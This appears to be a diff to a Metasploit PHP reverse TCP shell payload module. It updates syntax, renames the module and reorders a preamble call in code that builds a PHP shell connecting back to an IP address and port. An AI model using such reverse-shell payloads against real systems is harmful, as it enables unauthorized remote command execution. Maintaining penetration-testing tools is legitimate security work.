@@ -1,15 +1,16 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/payload/php'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
+
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
   include Msf::Payload::Php
@@ -62,14 +63,14 @@ module Metasploit3
     end
 
     shell=<<-END_OF_PHP_CODE
+    #{php_preamble(disabled_varname: "$dis")}
     $ipaddr='#{ipaddr}';
     $port=#{port};
-    #{php_preamble({:disabled_varname => "$dis"})}
 
     if(!function_exists('#{exec_funcname}')){
       function #{exec_funcname}($c){
         global $dis;
-        #{php_system_block({:cmd_varname => "$c", :disabled_varname => "$dis", :output_varname => "$o"})}
+        #{php_system_block(cmd_varname: "$c", disabled_varname: "$dis", output_varname: "$o")}
         return $o;
       }
     }
@@ -127,5 +128,4 @@ module Metasploit3
   def generate
     return super + php_reverse_shell
   end
-
 end
